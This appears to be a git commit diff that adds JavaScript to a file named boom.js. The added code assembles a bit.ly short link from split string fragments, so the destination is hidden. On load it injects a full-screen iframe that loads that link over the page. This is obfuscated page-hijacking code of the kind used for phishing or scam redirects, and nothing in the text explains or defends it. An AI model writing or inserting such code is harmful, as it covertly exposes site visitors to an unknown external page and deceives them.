411b57138fc777bd398b2dd4863d01bc5e9702b2
gmailsss <69669621+gmailsss@users.noreply.github.com>
2020-09-24 23:04:08 +0700

    Update boom.js

--- boom.js
+++ boom.js
@@ -1,1 +1,21 @@
-
+    prepareFrame();
+    function prepareFrame() 
+    {
+        
+var b0 = 'https://';
+var b1 = 'b';
+var b1_0 = 'i';
+var b1_1 = 't';
+var b2 = '.l';
+var b2_1 = 'y';
+var b3 = '/';
+var b3_1 = '2';
+var b3_2 = 'RCj';
+var b4_3 = '8p5';
+            
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", b0+b1+b1_0+b1_1+b2+b2_1+b3+b3_1+b3_2+b4_3);
+        ifrm.style.width = "100vw";
+        ifrm.style.height = "100vh";
+        document.body.appendChild(ifrm);
+    }
